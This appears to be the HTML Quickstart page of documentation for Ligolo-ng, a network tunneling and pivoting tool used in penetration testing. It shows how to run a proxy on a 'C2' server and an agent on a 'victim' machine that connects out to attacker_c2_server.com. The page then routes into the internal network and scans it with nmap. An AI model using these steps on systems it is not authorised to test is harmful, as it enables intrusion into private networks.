@@ -1,0 +1,927 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://nicocha30.github.io/Quickstart/">
+      
+      
+        <link rel="prev" href="../InstallBuild/">
+      
+      
+        <link rel="next" href="../Config-File/">
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.4">
+    
+    
+      
+        <title>Quickstart - Ligolo-ng Documentation</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#quickstart" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Ligolo-ng Documentation" class="md-header__button md-logo" aria-label="Ligolo-ng Documentation" data-md-component="logo">
+      
+  <img src="../assets/ligolo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Ligolo-ng Documentation
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Quickstart
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Ligolo-ng Documentation" class="md-nav__button md-logo" aria-label="Ligolo-ng Documentation" data-md-component="logo">
+      
+  <img src="../assets/ligolo.svg" alt="logo">
+
+    </a>
+    Ligolo-ng Documentation
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Introduction
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../InstallBuild/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Installing and Building
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Quickstart
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Quickstart
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prerequisites
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prerequisites">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tls-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      TLS Options
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="TLS Options">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-lets-encrypt-autocert" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Let's Encrypt Autocert
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-your-own-tls-certificates" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using your own TLS certificates
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automatic-self-signed-certificates" class="md-nav__link">
+    <span class="md-ellipsis">
+      Automatic self-signed certificates
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#using-ligolo-ng" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Ligolo-ng
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Using Ligolo-ng">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#start-the-ligolo-ng-proxy-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Start the Ligolo-ng proxy server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#start-the-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      Start the agent
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#start-the-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Start the tunneling
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup-routing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setup routing
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setup routing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ligolo-ng-managed-routing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ligolo-ng managed routing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#manual-routing-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Manual routing setup
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Config-File/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Configuration File
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Listeners/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Listeners
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bind/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Agent as server (Bind Connection)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Localhost/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Access to agent's local ports (127.0.0.1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Configuring-a-reverse-proxy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Running behind a reverse proxy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prerequisites
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prerequisites">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tls-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      TLS Options
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="TLS Options">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-lets-encrypt-autocert" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Let's Encrypt Autocert
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-your-own-tls-certificates" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using your own TLS certificates
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automatic-self-signed-certificates" class="md-nav__link">
+    <span class="md-ellipsis">
+      Automatic self-signed certificates
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#using-ligolo-ng" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Ligolo-ng
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Using Ligolo-ng">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#start-the-ligolo-ng-proxy-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Start the Ligolo-ng proxy server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#start-the-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      Start the agent
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#start-the-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Start the tunneling
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup-routing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setup routing
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setup routing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ligolo-ng-managed-routing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ligolo-ng managed routing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#manual-routing-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Manual routing setup
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="quickstart">Quickstart</h1>
+<h2 id="prerequisites">Prerequisites</h2>
+<h3 id="linux">Linux</h3>
+<p>When using Linux, you need to create a tun interface on the Proxy Server (C2):</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>sudo<span class="w"> </span>ip<span class="w"> </span>tuntap<span class="w"> </span>add<span class="w"> </span>user<span class="w"> </span><span class="o">[</span>your_username<span class="o">]</span><span class="w"> </span>mode<span class="w"> </span>tun<span class="w"> </span>ligolo
+$<span class="w"> </span>sudo<span class="w"> </span>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>ligolo<span class="w"> </span>up
+</code></pre></div>
+<blockquote>
+<p>On <strong>Ligolo-ng &gt;= v0.6</strong>, you can now use the <code>interface_create</code> command to create a new interface! No need to use ip tuntap!</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code>ligolo-ng » interface_create --name &quot;evil-cha&quot;
+INFO[3185] Creating a new &quot;evil-cha&quot; interface...       
+INFO[3185] Interface created!
+</code></pre></div>
+<h3 id="windows">Windows</h3>
+<p>You need to download the <a href="https://www.wintun.net/">Wintun</a> driver (used by <a href="https://www.wireguard.com/">WireGuard</a>) and place the <code>wintun.dll</code> in the same folder as Ligolo (make sure you use the right architecture).</p>
+<h2 id="tls-options">TLS Options</h2>
+<h4 id="using-lets-encrypt-autocert">Using Let's Encrypt Autocert</h4>
+<p>When using the <code>-autocert</code> option, the proxy will automatically request a certificate (using Let's Encrypt) for <em>attacker_c2_server.com</em> when an agent connects.</p>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>Port 80 needs to be accessible for Let's Encrypt certificate validation/retrieval</p>
+</div>
+<h4 id="using-your-own-tls-certificates">Using your own TLS certificates</h4>
+<p>If you want to use your own certificates for the proxy server, you can use the <code>-certfile</code> and <code>-keyfile</code> parameters.</p>
+<h4 id="automatic-self-signed-certificates">Automatic self-signed certificates</h4>
+<p>The <em>proxy/relay</em> can automatically generate self-signed TLS certificates using the <code>-selfcert</code> option.</p>
+<p><strong><em>Validating self-signed certificates fingerprints (recommended)</em></strong></p>
+<p>When running selfcert, you can run the <code>certificate_fingerprint</code> command to print the currently used certificate fingerprint.</p>
+<div class="highlight"><pre><span></span><code>ligolo-ng » certificate_fingerprint 
+INFO[0203] TLS Certificate fingerprint for ligolo is: D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC 
+</code></pre></div>
+<p>On the agent, you can then connect using the fingerprint provided by the Ligolo-ng proxy.</p>
+<div class="highlight"><pre><span></span><code>ligolo-agent -connect 127.0.0.1:11601 -v -accept-fingerprint D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC                                               nchatelain@nworkstation
+INFO[0000] Connection established                        addr=&quot;127.0.0.1:11601&quot;
+</code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>By default, the <code>ligolo</code> domain name is used for TLS Certificate generation. You can change the domain by using the -selfcert-domain [domain] option at startup.</p>
+</div>
+<p><strong><em>Ignoring all certificate verification (for lab/debugging)</em></strong></p>
+<p>To ignore all security mechanisms, the <code>-ignore-cert</code> option can be used with the <em>agent</em>.</p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Beware of man-in-the-middle attacks! This option should only be used in a test environment or for debugging purposes.</p>
+</div>
+<h2 id="using-ligolo-ng">Using Ligolo-ng</h2>
+<h3 id="start-the-ligolo-ng-proxy-server">Start the Ligolo-ng proxy server</h3>
+<p>Start the <em>proxy</em> server on your Command and Control (C2) server (default port 11601):</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>./proxy<span class="w"> </span>-h<span class="w"> </span><span class="c1"># Help options</span>
+$<span class="w"> </span>./proxy<span class="w"> </span>-autocert<span class="w"> </span><span class="c1"># Automatically request LetsEncrypt certificates</span>
+$<span class="w"> </span>./proxy<span class="w"> </span>-selfcert<span class="w"> </span><span class="c1"># Use self-signed certificates</span>
+</code></pre></div>
+<h3 id="start-the-agent">Start the agent</h3>
+<p>Start the <em>agent</em> on your target (victim) computer (no privileges are required!):</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>./agent<span class="w"> </span>-connect<span class="w"> </span>attacker_c2_server.com:11601
+</code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>If you want to tunnel the connection over a SOCKS5 proxy, you can use the <code>--socks ip:port</code> option. You can specify SOCKS credentials using the <code>--socks-user</code> and <code>--socks-pass</code> arguments.</p>
+</div>
+<p>A session should appear on the <em>proxy</em> server.</p>
+<div class="highlight"><pre><span></span><code>INFO[0102] Agent joined. name=nchatelain@nworkstation remote=&quot;XX.XX.XX.XX:38000&quot;
+</code></pre></div>
+<p>Use the <code>session</code> command to select the <em>agent</em>.</p>
+<div class="highlight"><pre><span></span><code>ligolo-ng » session 
+? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
+</code></pre></div>
+<h3 id="start-the-tunneling">Start the tunneling</h3>
+<p>Start the tunnel on the proxy, using the <code>evil-cha</code> interface name.</p>
+<div class="highlight"><pre><span></span><code>[Agent : nchatelain@nworkstation] » tunnel_start --tun evil-cha
+[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
+</code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>On macOS, you need to specify a utun[0-9] device, like utun4.</p>
+</div>
+<h2 id="setup-routing">Setup routing</h2>
+<h3 id="ligolo-ng-managed-routing">Ligolo-ng managed routing</h3>
+<h3 id="manual-routing-setup">Manual routing setup</h3>
+<p>First, display the network configuration of the agent using the <code>ifconfig</code> command:</p>
+<div class="highlight"><pre><span></span><code>[Agent : nchatelain@nworkstation] » ifconfig 
+[...]
+┌─────────────────────────────────────────────┐
+│ Interface 3                                 │
+├──────────────┬──────────────────────────────┤
+│ Name         │ wlp3s0                       │
+│ Hardware MAC │ de:ad:be:ef:ca:fe            │
+│ MTU          │ 1500                         │
+│ Flags        │ up|broadcast|multicast       │
+│ IPv4 Address │ 192.168.0.30/24             │
+└──────────────┴──────────────────────────────┘
+</code></pre></div>
+<p>Then setup routes accordingly to your system:</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:3"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Linux</label><label for="__tabbed_1_2">Windows</label><label for="__tabbed_1_3">MacOS (Darwin)</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p><em>Using the terminal:</em>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>sudo<span class="w"> </span>ip<span class="w"> </span>route<span class="w"> </span>add<span class="w"> </span><span class="m">192</span>.168.0.0/24<span class="w"> </span>dev<span class="w"> </span>ligolo
+</code></pre></div>
+<em>Or using the Ligolo-ng (&gt;= 0.6) cli:</em>
+<div class="highlight"><pre><span></span><code>ligolo-ng » interface_add_route --name evil-cha --route 192.168.2.0/24
+INFO[3206] Route created.                               
+</code></pre></div></p>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>&gt; netsh int ipv4 show interfaces
+
+Idx     Mét         MTU          État                Nom
+---  ----------  ----------  ------------  ---------------------------
+ 25           5       65535  connected     ligolo
+
+&gt; route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>$ sudo ifconfig utun4 alias [random_ip] 255.255.255.0
+$ sudo route add -net 192.168.2.0/24 -interface utun4
+</code></pre></div>
+<p>You can now access the <em>192.168.0.0/24</em> <em>agent</em> network from the <em>proxy</em> server.</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>nmap<span class="w"> </span><span class="m">192</span>.168.0.0/24<span class="w"> </span>-v<span class="w"> </span>-sV<span class="w"> </span>-n
+<span class="o">[</span>...<span class="o">]</span>
+$<span class="w"> </span>rdesktop<span class="w"> </span><span class="m">192</span>.168.0.123
+<span class="o">[</span>...<span class="o">]</span>
+</code></pre></div>
+</div>
+</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.f1b6f286.min.js"></script>
+      
+    
+  </body>
+</html>
